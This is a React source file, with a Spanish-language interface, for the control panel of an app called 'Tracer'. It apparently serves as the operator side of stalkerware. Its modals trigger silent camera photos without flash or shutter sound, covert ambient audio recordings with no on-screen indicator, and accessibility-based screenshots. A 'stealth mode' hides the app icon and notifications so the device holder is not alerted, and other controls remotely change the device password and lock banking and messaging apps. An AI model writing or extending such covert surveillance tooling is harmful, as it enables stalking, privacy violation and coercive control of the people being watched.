// Advanced action modals: Photo, Audio, Screen, Silent Call, Geofence, Stealth, Message, etc.

// Espera a que aparezca un archivo (foto/audio) más reciente que `since` en el
// backend, sondeando /api/<kind>/list. Devuelve { filename, timestamp, url } o null.
function useCaptureWatcher(kind, since) {
  const [asset, setAsset] = React.useState(null);
  const [timedOut, setTimedOut] = React.useState(false);

  React.useEffect(() => {
    setAsset(null);
    setTimedOut(false);
    if (!since) return;

    let stopped = false;
    let tries = 0;
    let objUrl = null;

    const tick = async () => {
      tries += 1;
      try {
        const list = await window.tracerApiFetch(`/api/${kind}/list?limit=1`);
        const item = Array.isArray(list) ? list[0] : null;
        if (item && new Date(item.timestamp).getTime() >= since - 3000) {
          const url = await window.tracerLoadAssetUrl(kind, item.filename);
          if (!stopped) {
            objUrl = url;
            setAsset({ filename: item.filename, timestamp: item.timestamp, url });
            return;
          }
        }
      } catch {}
      if (stopped) return;
      if (tries >= 25) { setTimedOut(true); return; }
      setTimeout(tick, 3000);
    };
    tick();

    return () => {
      stopped = true;
      if (objUrl) URL.revokeObjectURL(objUrl);
    };
  }, [kind, since]);

  return { asset, timedOut };
}

function CaptureWaiting({ label }) {
  return (
    <div className="capture-status" style={{ padding: '28px 0', textAlign: 'center' }}>
      <span className="loader-dots"><i /><i /><i /></span>
      <div style={{ marginTop: 8 }}>{label}</div>
    </div>
  );
}

function PhotoModal({ open, device, onClose, onConfirm }) {
  const [stage, setStage] = React.useState('config'); // config | waiting | done
  const [since, setSince] = React.useState(0);
  const [cam, setCam] = React.useState('front');
  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);

  const { asset, timedOut } = useCaptureWatcher('photo', since);
  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);

  if (!device) return null;

  const start = async () => {
    setSince(Date.now());
    setStage('waiting');
    try { await onConfirm(); } catch { setStage('config'); }
  };

  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">Vigilancia · Foto remota</div>
        <h3>Captura desde la cámara</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>

      <div className="modal-body">
        {stage === 'config' && (
          <>
            <p className="modal-lead">
              Toma una foto silenciosa desde la cámara frontal del dispositivo, sin
              alerta, flash ni sonido de obturador. Aparecerá aquí cuando el
              dispositivo la suba.
            </p>
            <div className="cam-picker">
              <button className={`cam-tile ${cam === 'front' ? 'is-active' : ''}`} onClick={() => setCam('front')}>
                <IconCamera width={20} height={20} />
                <div className="cam-tile-label">Cámara frontal</div>
                <div className="cam-tile-help">Predeterminada</div>
              </button>
            </div>
          </>
        )}

        {stage === 'waiting' && (
          timedOut
            ? <p className="modal-lead">El comando se envió pero el dispositivo aún no subió la foto.
                Puede estar sin conexión. Revisá Actividad más tarde.</p>
            : <CaptureWaiting label="Comando enviado · esperando la foto del dispositivo…" />
        )}

        {stage === 'done' && asset && (
          <div className="capture-result">
            <div className="capture-photo">
              <img src={asset.url} alt="Foto capturada" style={{ width: '100%', borderRadius: 8, display: 'block' }} />
              <div className="capture-meta">
                <div className="capture-meta-row"><span>Archivo</span><span className="mono">{asset.filename}</span></div>
                <div className="capture-meta-row"><span>Subida</span><span className="mono">{tracerFormatHistoryTime(asset.timestamp)}</span></div>
              </div>
            </div>
          </div>
        )}
      </div>

      <footer className="modal-foot">
        {stage === 'config' && (
          <>
            <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
            <button className="btn btn-primary" onClick={start}>
              <IconCamera width={14} height={14} /> Capturar foto
            </button>
          </>
        )}
        {stage !== 'config' && (
          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
        )}
      </footer>
    </Modal>
  );
}

function AudioModal({ open, device, onClose, onConfirm }) {
  const [stage, setStage] = React.useState('config'); // config | waiting | done
  const [duration, setDuration] = React.useState(60);
  const [since, setSince] = React.useState(0);

  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);

  const { asset, timedOut } = useCaptureWatcher('audio', since);
  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);

  if (!device) return null;
  const start = async () => {
    setSince(Date.now());
    setStage('waiting');
    try { await onConfirm(String(duration)); } catch { setStage('config'); }
  };

  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">Vigilancia · Audio ambiente</div>
        <h3>Grabar audio del entorno</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>

      <div className="modal-body">
        {stage === 'config' && (
          <>
            <p className="modal-lead">
              Graba sonido ambiente desde el micrófono de forma encubierta.
              La grabación aparecerá aquí cuando el dispositivo la suba.
            </p>
            <div className="form-field">
              <span>Duración</span>
              <div className="seg seg-full">
                {[30, 60, 120, 300].map((d) => (
                  <button key={d}
                    className={`seg-btn ${duration === d ? 'is-on' : ''}`}
                    onClick={() => setDuration(d)}>
                    {d < 60 ? `${d}s` : `${d / 60} min`}
                  </button>
                ))}
              </div>
            </div>
          </>
        )}

        {stage === 'waiting' && (
          timedOut
            ? <p className="modal-lead">El comando se envió. La grabación de {fmtSec(duration)} aún no
                llegó — el dispositivo puede estar sin conexión. Revisá Actividad más tarde.</p>
            : <CaptureWaiting label={`Grabando ~${fmtSec(duration)} en el dispositivo · esperando el archivo…`} />
        )}

        {stage === 'done' && asset && (
          <div className="capture-result">
            <div className="audio-result-card">
              <div className="audio-result-icon"><IconMic width={20} height={20} /></div>
              <div className="audio-result-body">
                <div className="audio-result-title mono">{asset.filename}</div>
                <div className="audio-result-meta mono">{tracerFormatHistoryTime(asset.timestamp)}</div>
              </div>
            </div>
            <audio controls src={asset.url} style={{ width: '100%', marginTop: 12 }} />
          </div>
        )}
      </div>

      <footer className="modal-foot">
        {stage === 'config' && (
          <>
            <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
            <button className="btn btn-primary" onClick={start}>
              <IconMic width={14} height={14} /> Iniciar grabación
            </button>
          </>
        )}
        {stage !== 'config' && (
          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
        )}
      </footer>
    </Modal>
  );
}

function fmtSec(s) {
  const m = Math.floor(s / 60);
  const r = s % 60;
  return `${String(m).padStart(2, '0')}:${String(r).padStart(2, '0')}`;
}

function ScreenshotModal({ open, device, onClose, onConfirm }) {
  const [stage, setStage] = React.useState('config'); // config | waiting | done
  const [since, setSince] = React.useState(0);
  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);

  const { asset, timedOut } = useCaptureWatcher('photo', since);
  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);

  if (!device) return null;
  const start = async () => {
    setSince(Date.now());
    setStage('waiting');
    try { await onConfirm(); } catch { setStage('config'); }
  };

  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">Vigilancia · Captura de pantalla</div>
        <h3>Capturar lo que ve en pantalla</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>

      <div className="modal-body">
        {stage === 'config' && (
          <p className="modal-lead">
            Toma una imagen de lo que se muestra en el dispositivo en este momento.
            Requiere el servicio de accesibilidad activo. Aparecerá aquí cuando se suba.
          </p>
        )}
        {stage === 'waiting' && (
          timedOut
            ? <p className="modal-lead">Comando enviado, sin captura todavía. Puede que el servicio de
                accesibilidad no esté activo o el dispositivo esté sin conexión.</p>
            : <CaptureWaiting label="Comando enviado · esperando la captura de pantalla…" />
        )}
        {stage === 'done' && asset && (
          <div className="capture-result">
            <img src={asset.url} alt="Captura de pantalla" style={{ width: '100%', borderRadius: 8, display: 'block' }} />
            <div className="capture-meta">
              <div className="capture-meta-row"><span>Archivo</span><span className="mono">{asset.filename}</span></div>
              <div className="capture-meta-row"><span>Subida</span><span className="mono">{tracerFormatHistoryTime(asset.timestamp)}</span></div>
            </div>
          </div>
        )}
      </div>

      <footer className="modal-foot">
        {stage === 'config' ? (
          <>
            <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
            <button className="btn btn-primary" onClick={start}><IconScreen width={14} height={14} /> Capturar ahora</button>
          </>
        ) : (
          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
        )}
      </footer>
    </Modal>
  );
}

function SilentCallModal({ open, device, onClose, onConfirm }) {
  const [stage, setStage] = React.useState('config'); // config | waiting | done
  const [since, setSince] = React.useState(0);
  React.useEffect(() => { if (open) { setStage('config'); setSince(0); } }, [open]);

  const { asset, timedOut } = useCaptureWatcher('audio', since);
  React.useEffect(() => { if (asset) setStage('done'); }, [asset]);

  if (!device) return null;
  const start = async () => {
    setSince(Date.now());
    setStage('waiting');
    try { await onConfirm(); } catch { setStage('config'); }
  };

  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">Vigilancia · Escucha del entorno</div>
        <h3>Grabar el entorno del dispositivo</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>

      <div className="modal-body">
        {stage === 'config' && (
          <p className="modal-lead">
            Graba ~60 s de audio ambiente sin ningún indicador en la pantalla del
            dispositivo. No es una transmisión en vivo: el audio se sube al terminar.
          </p>
        )}
        {stage === 'waiting' && (
          timedOut
            ? <p className="modal-lead">Comando enviado. La grabación aún no llegó — el dispositivo
                puede estar sin conexión o sin permiso de micrófono.</p>
            : <CaptureWaiting label="Grabando ~60 s en el dispositivo · esperando el audio…" />
        )}
        {stage === 'done' && asset && (
          <div className="capture-result">
            <div className="audio-result-card">
              <div className="audio-result-icon"><IconMic width={20} height={20} /></div>
              <div className="audio-result-body">
                <div className="audio-result-title mono">{asset.filename}</div>
                <div className="audio-result-meta mono">{tracerFormatHistoryTime(asset.timestamp)}</div>
              </div>
            </div>
            <audio controls src={asset.url} style={{ width: '100%', marginTop: 12 }} />
          </div>
        )}
      </div>

      <footer className="modal-foot">
        {stage === 'config' ? (
          <>
            <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
            <button className="btn btn-primary" onClick={start}>
              <IconMic width={14} height={14} /> Grabar entorno
            </button>
          </>
        ) : (
          <button className="btn btn-ghost" onClick={onClose}>Cerrar</button>
        )}
      </footer>
    </Modal>
  );
}

function MessageModal({ open, device, onClose, onConfirm }) {
  const [text, setText] = React.useState('Si encontraste este dispositivo, por favor contáctame.');
  const [vibrate, setVibrate] = React.useState(true);
  if (!device) return null;
  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">Mensaje en pantalla</div>
        <h3>Enviar mensaje a {device.name}</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>
      <div className="modal-body">
        <p className="modal-lead">
          Muestra una notificación a pantalla completa sin bloquear el dispositivo.
          Se mantiene visible hasta que toquen "Entendido".
        </p>
        <div className="form-field">
          <span>Mensaje</span>
          <textarea rows={3} value={text} onChange={(e) => setText(e.target.value)} />
          <small>{text.length} / 200</small>
        </div>
        <div className="checkbox-row">
          <label className="checkbox">
            <input type="checkbox" checked={vibrate} onChange={(e) => setVibrate(e.target.checked)} />
            <span>Acompañar con vibración</span>
          </label>
        </div>
      </div>
      <footer className="modal-foot">
        <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
        <button className="btn btn-primary" onClick={() => onConfirm(text)}>
          <IconMessage width={14} height={14} /> Enviar mensaje
        </button>
      </footer>
    </Modal>
  );
}

const GEOFENCE_ACCENT = '#2563EB';

// Editor real de geocerca: mapa Leaflet, centro arrastrable, radio ajustable.
// Se monta solo cuando el modal está abierto (Modal devuelve null si !open).
function GeofenceEditor({ device, onClose, onConfirm, onDelete }) {
  const mapDivRef = React.useRef(null);
  const mapRef = React.useRef(null);
  const circleRef = React.useRef(null);
  const markerRef = React.useRef(null);

  const [radius, setRadius] = React.useState(300);
  const [center, setCenter] = React.useState({
    lat: device.lat || 19.4284,
    lon: device.lon || -99.1660,
  });
  const [existing, setExisting] = React.useState(false);
  const [busy, setBusy] = React.useState(false);
  const [err, setErr] = React.useState('');

  // Cargar geocerca existente para precargar el editor
  React.useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const gf = await window.tracerApiFetch('/api/geofence');
        if (!cancelled && gf && typeof gf.lat === 'number') {
          setCenter({ lat: gf.lat, lon: gf.lon });
          setRadius(Math.round(gf.radius) || 300);
          setExisting(true);
        }
      } catch {}
    })();
    return () => { cancelled = true; };
  }, []);

  // Inicializar Leaflet
  React.useEffect(() => {
    if (!mapDivRef.current || mapRef.current || typeof L === 'undefined') return;
    const map = L.map(mapDivRef.current, { zoomControl: true, attributionControl: false })
      .setView([center.lat, center.lon], 15);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);

    const circle = L.circle([center.lat, center.lon], {
      radius, color: GEOFENCE_ACCENT, weight: 2, fillOpacity: 0.12,
    }).addTo(map);
    const marker = L.marker([center.lat, center.lon], { draggable: true }).addTo(map);

    marker.on('drag', () => circle.setLatLng(marker.getLatLng()));
    marker.on('dragend', () => {
      const p = marker.getLatLng();
      setCenter({ lat: p.lat, lon: p.lng });
    });
    map.on('click', (e) => {
      marker.setLatLng(e.latlng);
      circle.setLatLng(e.latlng);
      setCenter({ lat: e.latlng.lat, lon: e.latlng.lng });
    });

    mapRef.current = map;
    circleRef.current = circle;
    markerRef.current = marker;
    // El modal aparece con animación: recalcular tamaño cuando ya es visible
    setTimeout(() => map.invalidateSize(), 150);

    return () => {
      map.remove();
      mapRef.current = null;
      circleRef.current = null;
      markerRef.current = null;
    };
  }, []);

  // Reflejar cambios de estado (radio, centro cargado del backend) en el mapa
  React.useEffect(() => {
    if (circleRef.current) circleRef.current.setRadius(radius);
  }, [radius]);
  React.useEffect(() => {
    if (!mapRef.current) return;
    const ll = [center.lat, center.lon];
    circleRef.current && circleRef.current.setLatLng(ll);
    markerRef.current && markerRef.current.setLatLng(ll);
    mapRef.current.setView(ll);
  }, [center]);

  const save = async () => {
    setBusy(true);
    setErr('');
    try {
      await onConfirm({ lat: center.lat, lon: center.lon, radius, enabled: true });
    } catch {
      setErr('No se pudo guardar la geocerca. Reintentá.');
      setBusy(false);
    }
  };

  const remove = async () => {
    setBusy(true);
    setErr('');
    try {
      await onDelete();
    } catch {
      setErr('No se pudo eliminar la geocerca.');
      setBusy(false);
    }
  };

  return (
    <>
      <header className="modal-head">
        <div className="modal-eyebrow">Localización · Geocerca</div>
        <h3>{existing ? 'Editar' : 'Crear'} perímetro de seguridad</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>
      <div className="modal-body">
        <p className="modal-lead">
          Tocá el mapa o arrastrá el marcador para fijar el centro. Recibirás una
          alerta cuando {device.name} salga de la zona.
        </p>

        <div className="geofence-preview">
          <div ref={mapDivRef} className="geofence-map" style={{ height: 260 }} />
        </div>

        <div className="form-grid form-grid-2" style={{ marginTop: 12 }}>
          <div className="form-field">
            <span>Radio: <span className="mono">{radius} m</span></span>
            <input type="range" min="100" max="2000" step="50"
                   value={radius} onChange={(e) => setRadius(+e.target.value)}
                   className="range" />
          </div>
          <div className="form-field">
            <span>Centro</span>
            <span className="mono" style={{ fontSize: 12 }}>
              {center.lat.toFixed(5)}, {center.lon.toFixed(5)}
            </span>
          </div>
        </div>

        {err && <div className="modal-error" style={{ color: 'var(--danger, #dc2626)', fontSize: 13, marginTop: 8 }}>{err}</div>}
      </div>
      <footer className="modal-foot">
        {existing && (
          <button className="btn btn-ghost" onClick={remove} disabled={busy}
                  style={{ marginRight: 'auto', color: 'var(--danger, #dc2626)' }}>
            Eliminar
          </button>
        )}
        <button className="btn btn-ghost" onClick={onClose} disabled={busy}>Cancelar</button>
        <button className="btn btn-primary" onClick={save} disabled={busy}>
          <IconGeofence width={14} height={14} /> {existing ? 'Guardar' : 'Crear geocerca'}
        </button>
      </footer>
    </>
  );
}

function GeofenceModal({ open, device, onClose, onConfirm, onDelete }) {
  if (!device) return null;
  return (
    <Modal open={open} onClose={onClose} size="lg">
      <GeofenceEditor device={device} onClose={onClose} onConfirm={onConfirm} onDelete={onDelete} />
    </Modal>
  );
}

function SimpleConfirmModal({ open, device, onClose, onConfirm, kind }) {
  const conf = {
    flash: { eyebrow: 'Localización · Linterna', title: 'Activar linterna', body: 'Enciende la linterna del dispositivo al máximo y la hace parpadear durante 60 segundos.', cta: 'Encender linterna', Icon: IconFlash },
    vibrate: { eyebrow: 'Localización · Vibración', title: 'Hacer vibrar', body: 'Vibrará en intervalos cortos durante 60 segundos, aún en modo silencio.', cta: 'Iniciar vibración', Icon: IconVibrate },
    stealth: { eyebrow: 'Avanzado · Modo sigilo', title: 'Activar modo sigilo', body: 'Oculta el ícono de Tracer, desactiva notificaciones visibles y registra todo en segundo plano sin alertar a quien tenga el dispositivo.', cta: 'Activar sigilo', Icon: IconStealth },
    gps: { eyebrow: 'Localización · GPS de precisión', title: 'Forzar GPS de alta precisión', body: 'Activa simultáneamente GPS, Wi-Fi, Bluetooth y triangulación celular. Consume batería rápidamente.', cta: 'Activar precisión', Icon: IconBoltGPS },
    key: { eyebrow: 'Seguridad · Cambiar contraseña', title: 'Cambiar contraseña remotamente', body: 'Genera una nueva contraseña aleatoria de 12 caracteres y la aplica al dispositivo. La verás solo aquí.', cta: 'Generar y aplicar', Icon: IconKey },
    apps: { eyebrow: 'Seguridad · Bloquear apps', title: 'Bloquear apps sensibles', body: 'Bloquea inmediatamente apps de banca, correo, mensajería y redes sociales. Solo se desbloquean con tu contraseña maestra.', cta: 'Bloquear apps', Icon: IconAppBlock },
  };
  const c = conf[kind];
  if (!device || !c) return null;
  const Icon = c.Icon;
  return (
    <Modal open={open} onClose={onClose}>
      <header className="modal-head">
        <div className="modal-eyebrow">{c.eyebrow}</div>
        <h3>{c.title}</h3>
        <button className="modal-close" onClick={onClose}><IconClose width={14} height={14} /></button>
      </header>
      <div className="modal-body">
        <div className="simple-confirm">
          <div className="simple-confirm-icon"><Icon width={22} height={22} /></div>
          <p className="modal-lead" style={{ margin: 0 }}>{c.body}</p>
        </div>
      </div>
      <footer className="modal-foot">
        <button className="btn btn-ghost" onClick={onClose}>Cancelar</button>
        <button className="btn btn-primary" onClick={onConfirm}>
          <Icon width={14} height={14} /> {c.cta}
        </button>
      </footer>
    </Modal>
  );
}

window.PhotoModal = PhotoModal;
window.AudioModal = AudioModal;
window.ScreenshotModal = ScreenshotModal;
window.SilentCallModal = SilentCallModal;
window.MessageModal = MessageModal;
window.GeofenceModal = GeofenceModal;
window.SimpleConfirmModal = SimpleConfirmModal;
